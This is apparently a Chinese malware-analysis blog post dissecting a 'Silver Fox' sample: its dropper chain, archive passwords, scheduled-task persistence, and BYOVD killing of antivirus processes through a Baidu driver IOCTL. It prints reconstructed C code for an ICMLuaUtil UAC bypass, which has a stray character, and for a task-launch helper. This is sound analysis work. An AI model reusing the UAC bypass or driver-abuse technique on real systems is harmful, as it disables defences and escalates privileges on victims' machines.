@@ -1,0 +1,549 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#15171a">
+  <meta name="description" content="（1）BYOVD技术关闭杀软进程实现方式 开源项目，已经被杀，可以再分析一下BdApiUtil64.sys驱动（√ （2）rwdriver.sys 实现的edr致盲方式 直接看开源代码就行（√ （3）对特定API函数HOOK来实现Rootkit技术的技术细节 YiFanyi_setup.exe Inno Setup安装程序，有阿里的无效签...">
+  <meta name="author" content="YCr0w">
+  <title>银狐 10月 | YCr0w&#39;blog</title>
+  <link rel="icon" type="image/x-icon" href="/assets/site/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/site.css">
+  <script src="/assets/vendor/lucide.js" defer></script>
+  <script src="/assets/js/site.js" defer></script>
+</head>
+<body class="article-page">
+  <header class="site-header">
+    <div class="header-profile">
+      <a class="header-identity" href="/" aria-label="返回首页"><img class="header-avatar" src="/assets/site/avatar.jpg" alt="YCr0w"><span class="header-name">YCr0w</span></a>
+      <div class="header-links"><a href="https://github.com/YCr0w" target="_blank" rel="noopener" aria-label="GitHub"><i data-lucide="github" aria-hidden="true"></i></a><a href="mailto:3083981460@qq.com" aria-label="Email"><i data-lucide="mail" aria-hidden="true"></i></a></div>
+    </div>
+    <button class="nav-toggle icon-button" type="button" aria-label="打开导航"><i data-lucide="menu" aria-hidden="true"></i></button>
+    <nav class="main-nav" aria-label="主导航">
+      <a href="/"><i data-lucide="house" aria-hidden="true"></i><span>首页</span></a><a href="/categories/"><i data-lucide="folder-tree" aria-hidden="true"></i><span>分类</span></a><a href="/archives/"><i data-lucide="archive" aria-hidden="true"></i><span>归档</span></a><a href="/about/"><i data-lucide="user-round" aria-hidden="true"></i><span>关于</span></a>
+    </nav>
+    <div class="header-actions">
+      <div class="search-inline" id="search-inline">
+        <button class="icon-button" id="search-button" type="button" aria-label="搜索" aria-expanded="false"><i data-lucide="search" aria-hidden="true"></i></button>
+        <input id="search-input" type="search" placeholder="搜索文章、标签或分类" autocomplete="off">
+        <div class="search-results" id="search-results"></div>
+      </div>
+      <button class="icon-button" id="theme-button" type="button" aria-label="切换主题"><i data-lucide="sun-moon" aria-hidden="true"></i></button>
+    </div>
+  </header>
+  <main class="article-shell">
+    <article class="article"><header class="article-header"><a class="article-category" href="/categories/malware-analysis/" style="--category-color:#d84a5b"><span class="category-dot"></span>恶意软件分析</a><h1>银狐 10月</h1><p>（1）BYOVD技术关闭杀软进程实现方式 开源项目，已经被杀，可以再分析一下BdApiUtil64.sys驱动（√ （2）rwdriver.sys 实现的edr致盲方式 直接看开源代码就行（√ （3）对特定API函数HOOK来实现Rootkit技术的技术细节 YiFanyi_setup.exe Inno Setup安装程序，有阿里的无效签...</p><div class="article-meta"><span><i data-lucide="calendar-days" aria-hidden="true"></i>2026年8月13日</span><span><i data-lucide="clock-3" aria-hidden="true"></i>19 分钟阅读</span></div><div class="tag-list"></div></header><div class="article-body markdown-body"><p>（1）BYOVD技术关闭杀软进程实现方式</p>
+<p>开源项目，已经被杀，可以再分析一下BdApiUtil64.sys驱动（√</p>
+<p>（2）rwdriver.sys 实现的edr致盲方式</p>
+<p>直接看开源代码就行（√</p>
+<p>（3）对特定API函数HOOK来实现Rootkit技术的技术细节</p>
+<h2 id="yifanyi_setup.exe">YiFanyi_setup.exe</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764075788094-959d33ae-97e8-4b39-8338-fe7e6c84af09.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>Inno Setup安装程序，有阿里的无效签名</p>
+<p>InnoExtractor 提取一下文件</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764077432897-c65553d1-481a-4e95-adad-fcbde2f40b35.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>查看install_script可以知道程序安装路径是<code>C:\ProgramData\WindowsData</code></p>
+<p>释放的文件为</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764123985425-7103b1ce-932a-4907-876b-7323a181b5ec.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><strong>mainZTtRjTfyhNIDCAF.xml</strong>文件其实都是7z压缩包，运行样本，使用火绒剑抓一下行为</p>
+<p>会在<code>C:\ProgramData\WindowsData</code>路径释放文件，释放的文件为</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764124091220-8e5ad309-4a9f-400e-a882-95210ba02780.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="funzip.exe">funzip.exe</h2>
+<p>因为<strong>mainZTtRjTfyhNIDCAF.xml</strong>为压缩包，所以怀疑funzip为解压工具，使用IDA简单看一眼</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764124217046-1c03b1fb-1a97-469d-aab7-0e6e676cc612.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>使用7zip源码构造的解压工具，使用火绒剑抓一下解压指令</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764124262627-d3c98b34-b36e-4896-adb5-f721d94e5c3a.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><code>"C:\ProgramData\WindowsData\funzip.exe" x -y -phtLcENyRFYwXsHFnUnqK -o"C:\ProgramData\WindowsData" "C:\ProgramData\WindowsData\mainZTtRjTfyhNIDCAF.xml"</code></p>
+<p>找到解压密码：<code>phtLcENyRFYwXsHFnUnqK</code></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764125235492-6438f7e5-41d6-4eb5-8b1a-2bf23e0a0334.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>解压成功</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764125268949-def8f58e-0221-4452-9cad-629a8457a78b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>成功释放了men.exe与setup.exe，其中setup为正常的翻译软件安装程序（整个样本运行结束会删除这些文件）</p>
+<h2 id="men.exe">men.exe</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764130415689-9e3b77a8-f0ac-470f-bcb9-db5055bae6e3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>有UPX壳，无签名</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764130456092-50aa63d3-042c-4a75-b60f-c59127cc604e.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>开源项目脱壳</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764130736676-b2fe3c38-c61c-44a0-8d9d-7d1d823c6e87.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153687620-e7d08123-c18e-4e04-9eb9-8a2860ad173c.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>**GetFileAttributesA **判断me.key文件是否存在，存在则使用cmd运行重新启用被禁用的网卡，然后退出</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153791701-2a977340-421f-4d8c-8d19-562cd8f62ee3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>杀软列表解密</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153845687-89f83dd9-28f5-4c9c-a732-e878e0d47bbf.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>遍历快照然后获取系统中所有杀软的完整路径</p>
+<h3 id="释放tree并进行解压">释放tree并进行解压</h3>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153933613-fcf48f53-8284-4cf0-a66a-15c062abfda8.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>释放tree.exe（本质是zip)</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153960141-93bff86a-8296-4256-9dda-74abf8b49333.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>解密出<code>C:/Users/Public/Documents/WindowsData/tree.exe</code>路径，然后创建文件</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764153997822-f8ac7dee-70c4-49bf-9c47-7ec4c14763fc.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>释放tree.exe文件</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154145199-0317e796-8505-494e-80af-4262e29a2a29.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>解压释放的tree.exe，密码为<strong>Server8888</strong></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154491460-6ed71c28-bba3-4431-8174-b75d771bd981.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154188160-4f0dcb3b-a788-4f52-8116-e9b31b6d11c9.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>判断文件是否成功解压，同时遍历进程，查看是否存在指定杀软</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154236655-bb889432-e952-40b7-a649-bb2d03830188.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h3 id="释放edr并解压">释放edr并解压</h3>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154389932-e6c328e1-dd80-4fef-9433-ef6b946dd9eb.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>与tree.exe释放方式一样，释放edr.key，然后对edr.key进行解压（密码依旧是<strong>Server8888）</strong>，然后释放</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154527317-de0336d5-28f7-4365-98ff-8a79551dfdd8.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154546675-64c256f7-0514-48dc-a3cd-d59c0cbe856f.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>检查是否成功释放Bypass.exe</p>
+<h3 id="运行bypass.exe">运行bypass.exe</h3>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764154587576-270abbea-3fa8-4cc8-bdb5-896b024a2ee4.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p> wdc.dll!WdcRunTaskAsInteractiveUser  </p>
+<pre><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-title function_">HRESULT</span><span class="hljs-params">(WINAPI* PFN_WdcRunTaskAsInteractiveUser)</span><span class="hljs-params">(LPCWSTR executablePath, LPCWSTR arguments, UINT64 flags)</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+    HRESULT hr = CoInitialize(<span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (FAILED(hr)) {
+        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">"[-] CoInitialize failed. Error: "</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; hr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    HMODULE hWdc = LoadLibraryW(<span class="hljs-string">L"wdc.dll"</span>);
+    <span class="hljs-keyword">if</span> (!hWdc) {
+        <span class="hljs-comment">//std::cerr &lt;&lt; "[-] Failed to load wdc.dll. Error: " &lt;&lt; GetLastError() &lt;&lt; std::endl;</span>
+        CoUninitialize();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+
+    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName = <span class="hljs-string">"WdcRunTaskAsInteractiveUser"</span>;
+    PFN_WdcRunTaskAsInteractiveUser WdcRunTask = (PFN_WdcRunTaskAsInteractiveUser)GetProcAddress(hWdc, funcName);
+
+    <span class="hljs-keyword">if</span> (!WdcRunTask) {
+       <span class="hljs-comment">/* std::cerr &lt;&lt; "[-] Failed to find function: " &lt;&lt; funcName &lt;&lt; ". Error: " &lt;&lt; GetLastError() &lt;&lt; std::endl;*/</span>
+        FreeLibrary(hWdc);
+        CoUninitialize();
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+
+
+    Sleep(<span class="hljs-number">1000</span>);
+
+    LPCWSTR targetPath = <span class="hljs-string">L"C:\\Windows\\System32\\notepad.exe"</span>;
+    LPCWSTR targetArgs = <span class="hljs-literal">NULL</span>;
+
+    HRESULT callResult = WdcRunTask(targetPath, targetArgs, <span class="hljs-number">0</span>);
+
+    <span class="hljs-keyword">if</span> (SUCCEEDED(callResult)) {
+        <span class="hljs-comment">//std::cout &lt;&lt; "[+] SUCCESS! The task should be running now." &lt;&lt; std::endl;</span>
+
+    }
+    <span class="hljs-keyword">else</span> {
+        <span class="hljs-comment">//std::cerr &lt;&lt; "[-] Function call failed." &lt;&lt; std::endl;</span>
+    }
+
+    FreeLibrary(hWdc);
+    CoUninitialize();
+    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>.get();
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre><h3 id="禁用网络适配器并运行nvidia.exe">禁用网络适配器并运行NVIDIA.exe</h3>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764735947798-cea85709-8680-4de0-a5b5-121cb90a88bf.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>遍历检查360，然后采用；ShellExecuteA运行cmd然后执行<code>c wmic path win32_networkadapter where NetEnabled=FALSE call ena</code>启用禁用的网络适配器</p>
+<p>使用WinExec启动 NVIDIA.exe</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764736632195-0c0b37d4-b5c2-4e95-83d8-6b0dd2149217.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h3 id="释放me并解压-同时启动nthandlecallback">释放me并解压，同时启动NtHandleCallback</h3>
+<p>释放并解压me.key，解压密码：killstartup</p>
+<p>然后使用GetFileAttributesA判断NtHandleCallback.exe是否释放成功，然后使用WinExec启动NtHandleCallback.exe</p>
+<p>然后使用COM接口对NtHandleCallback.exe进行持久化</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764737484987-35784c1d-834b-4b9d-b9b3-8f42244fd766.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>stru_7FF6973A2750 (CLSID)：<code>{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}</code></p>
+<p> CLSID_TaskScheduler</p>
+<p>stru_7FF6973A2740 (IID)：<code>{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}</code></p>
+<p> IID_ITaskService</p>
+<p>设置计划任务作者：Microsoft Corporation</p>
+<p>行为：LogonTrigger</p>
+<p>路径：C:\Users\Public\Documents\WindowsData\NtHandleCallback.exe</p>
+<p>Task Name: WindowsPowerShell.WbemScripting.SWbemLocator。</p>
+<p>Flags: 6 (TASK_CREATE_OR_UPDATE)。</p>
+<p>User/Group: S-1-5-32-544，这是本地管理员组。</p>
+<p>LogonType: 4 (TASK_LOGON_GROUP)</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764737760459-dda872fd-bf02-45bb-8ca9-cc847ddace14.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h3 id="注册rwdriver-并启动main.exe">注册rwdriver、并启动main.exe</h3>
+<p>注册驱动，启动驱动rwdriver</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764737921922-db16aa91-363c-4ee6-9b7a-49086e065d3b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>轮询，检查服务的状态码是否为 SERVICE_RUNNING (4)，然后带参数1启动main.exe</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764753792676-0c8aeee6-da53-4aca-876a-61e53f9f70cc.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h3 id="删除衍生文件">删除衍生文件</h3>
+<p>通过DeleteFileA API强制删除杀软文件</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764752120179-1ee939e7-b5c4-45f3-a53d-246f77aed6ea.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>通过SetFileAttributesA API对释放衍生物的文件夹及其文件修改属性进行隐藏</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764753832573-4454f2da-d168-43cb-88b7-29d0e87316ce.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>释放del.bat，用于清理自身释放的衍生物</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764753615991-04c6620b-3fd1-459c-b15c-76cf403b2514.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="bypass.exe">Bypass.exe</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764754550840-19e79629-40d3-46f7-895f-17f70e75934a.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>无签名的可执行文件</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764758918043-a0ccbbdf-7ba9-4217-9c3a-bf4010c35d8d.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>有控制流平坦化，用deflat去一下ollvm</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765113420407-da399471-b608-4438-8802-d83116a7c374.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>去除得不完全，但是能勉强看清代码逻辑</p>
+<p>sub_14000F5C0</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765113574070-f8c0a79b-febb-446e-a29e-7a828f0c5b9c.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>调用 ReadProcessMemory</p>
+<p>sub_140009170</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765113645789-60c430cd-d5ab-4874-af1f-e5d990820f3c.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>这个函数在不去除平坦化时能查看到一些CLSIDFromString，通过这个能大致看出这里是在进行利用ICMLuaUtil 接口实现UAC Bypass，出自UAC ME的第43项</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765114355496-2405f59f-66d7-4752-a85a-70d77c676720.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<pre><code class="hljs language-c"><span class="hljs-type">const</span> CLSID CLSID_CMSTPLUA = { <span class="hljs-number">0x3E5FC7F9</span>, <span class="hljs-number">0x9A51</span>, <span class="hljs-number">0x4367</span>, { <span class="hljs-number">0x90</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC7</span> } };
+
+<span class="hljs-type">const</span> IID IID_ICMLuaUtil = { <span class="hljs-number">0x0A16D195</span>, <span class="hljs-number">0x6F47</span>, <span class="hljs-number">0x4964</span>, { <span class="hljs-number">0x92</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x27</span> } };
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ICMLuaUtil</span> :</span> public IUnknown
+{
+public:
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_3</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_4</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_5</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_6</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_7</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_8</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">UnknownMethod_9</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;
+
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">SetRegistryStringValue</span><span class="hljs-params">(
+        HKEY hKey, 
+        LPCWSTR lpSubKey, 
+        LPCWSTR lpValueName, 
+        LPCWSTR lpValueData
+    )</span> = <span class="hljs-number">0</span>;
+
+    virtual HRESULT STDMETHODCALLTYPE <span class="hljs-title function_">ShellExec</span><span class="hljs-params">(
+        LPCWSTR lpFile, 
+        LPCWSTR lpParameters, 
+        LPCWSTR lpDirectory, 
+        ULONG fMask, 
+        ULONG nShow
+    )</span> = <span class="hljs-number">0</span>;
+};
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">Deobfuscated_Payload_Loader</span><span class="hljs-params">()</span>
+{
+    HRESULT hr = S_OK;
+    ICMLuaUtil* pICMLuaUtil = nullptr;
+
+    hr = CoInitializeEx(<span class="hljs-literal">NULL</span>, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    <span class="hljs-keyword">if</span> (FAILED(hr)) <span class="hljs-keyword">return</span>;
+
+    hr = CoCreateInstance(CLSID_CMSTPLUA, <span class="hljs-literal">NULL</span>, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (<span class="hljs-type">void</span>**)&amp;pICMLuaUtil);
+    
+    <span class="hljs-keyword">if</span> (SUCCEEDED(hr) &amp;&amp; pICMLuaUtil != nullptr)
+    {
+        <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* decryptedPayloadPath = <span class="hljs-string">L"C:\\Users\\Public\\Documents\\WindowsData\\NVIDIA.lnk"</span>; 
+        hr = pICMLuaUtil-&gt;SetRegistryStringValue(
+            HKEY_LOCAL_MACHINE, 
+            <span class="hljs-string">L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration"</span>,
+            <span class="hljs-string">L"DisplayCalibrator"</span>,
+            decryptedPayloadPath 
+        );
+
+        <span class="hljs-keyword">if</span> (SUCCEEDED(hr))
+        {
+            pICMLuaUtil-&gt;ShellExec(
+                <span class="hljs-string">L"DisplayCalibrator"</span>, /
+                <span class="hljs-literal">NULL</span>, 
+                <span class="hljs-literal">NULL</span>, 
+                <span class="hljs-number">0</span>, 
+                SW_SHOW
+            );
+        }
+
+        pICMLuaUtil-&gt;Release();
+    }
+    CoUninitialize();
+}
+</code></pre><p>整体Bypass.exe实现的效果为：创建一个NVIDIA.lnk然后使用Windows 颜色管理组件的 COM 接口漏洞 ，修改注册表，使得系统在执行高权限任务时，启动 NVIDIA 快捷方式</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765161522015-4617fff4-e9b7-46a2-8351-5a73b4df3451.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>这个快捷方式正在启动的程序是KGseKKdKce.exe，也就是BdApiUtil64.sys的操作程序</p>
+<h2 id="nvidia.exe">NVIDIA.exe</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764754724578-b801be43-f8bb-4fee-b180-c0ed4125cefe.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>进行了UPX加壳</p>
+<p>使用IDA分析发现存在控制流平坦化</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764757407300-80be4780-fd37-4ad5-9ae1-fe4b220b17d7.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765168984559-74360bac-f75f-497d-a545-dc8b972fc3e3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>主要逻辑为释放驱动与遍历系统进程</p>
+<p>sub_7FF6723B6010</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765169055071-69c6caf2-055b-41ca-a11b-3b1ae109160a.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>释放的位置为：%Temp%，释放的驱动名称采用的是随机名称</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765167346189-fb870aba-1de5-453b-8253-e8e516b21ccf.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>解密需要释放的驱动，sub_7FF6723DA730函数会对释放的驱动注册为服务，以实现持久化</p>
+<p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\&lt;rand_name&gt;</code></p>
+<p>释放的驱动为：山东安在信息技术股份有限公司的Ping32产品的驱动程序</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765169585195-9474e180-ea10-4d90-813d-9ea5b9a5e3d3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765169629168-0d6b796b-d536-4270-9b2e-6db463bf3fa9.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>驱动释放成功之后会遍历系统进程判断是否存在指定的杀软进程，存在则通过BYOVD由释放的驱动实现关闭</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765168237632-9c8e18a1-ffe7-405e-99f5-6813b5c8fda6.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="bdapiutil64.sys">BdApiUtil64.sys</h2>
+<p>百度杀毒使用的驱动程序，签名正常</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764754921457-d11156b0-251c-46e9-8986-8f1e76b8bb43.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765171095281-04269e2d-23be-40a1-9795-14efda217263.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>定义了一个特定的 I/O 控制代码（IOCTL）0x800024B4，当用户模式的应用程序向驱动设备发送这个 IOCTL，并附带一个进程 ID (PID) 时，驱动程序不会进行验证，然后在内核模式下终止该 PID 对应的进程。</p>
+<h3 id="kgsekkdkce.exe">KGseKKdKce.exe</h3>
+<p>在样本中使用KGseKKdKce.exe对其进行利用，源于：<a href="https://github.com/BlackSnufkin/BYOVD/blob/main/BdApiUtil-Killer/src/main.rs">https://github.com/BlackSnufkin/BYOVD/blob/main/BdApiUtil-Killer/src/main.rs</a></p>
+<p>对KGseKKdKce进行了UPX打包</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765171646758-a43bb4c1-e6a7-4a4f-92da-75e9a0b2ecea.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>目标程序为国内一些常见杀软，其余部分与开源项目基本一致</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765171758395-4b52680c-9e60-4bd5-bcef-d5d6c7083d9a.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765171767198-7c7c7fc1-9ff6-4bc8-bbe7-d04174d606b8.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>大致逻辑为：遍历系统进程发现目标杀软进程就将其PID与IOCTL（0x800024B4）一起传到目标驱动</p>
+<h2 id="rwdriver.sys">rwdriver.sys</h2>
+<p>rwdriver.sys使用泄露的“中兴通讯股份有限公司”过期签名</p>
+<p>读写任意地址数据，进行拷贝覆盖，源自：</p>
+<p><a href="https://github.com/NanoWraith/rwdriver/tree/master/rwdriver">https://github.com/NanoWraith/rwdriver/tree/master/rwdriver</a></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764757073386-1e32c976-b8df-4449-a37f-9cad5b25b535.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1764755200853-ad9f2741-4cf7-425a-84dc-7bb87fcc6956.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
